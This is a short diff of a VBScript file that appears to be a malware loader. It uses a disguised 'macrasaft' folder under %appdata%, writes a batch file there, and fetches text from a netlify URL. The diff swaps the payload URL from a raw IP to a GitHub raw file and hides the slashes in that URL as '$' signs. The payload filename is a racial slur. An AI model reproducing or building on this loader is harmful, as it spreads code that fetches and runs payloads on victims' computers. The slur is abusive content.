@@ -4,7 +4,7 @@ Const appFolder = "%appdata%\macrasaft"
 Const batchFile = "%appdata%\macrasaft\special.bat"
 Const srcUrl = "https://cerulean-puppy-776621.netlify.app/main.txt"
 Const placeholder = "****"
-Const replUrl = "https:$$115.187.41.77$nigga.txt"
+Const replUrl = "https:$$raw.githubusercontent.com$Its-Mr-Null$marca$refs$heads$main$nigga.txt"
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
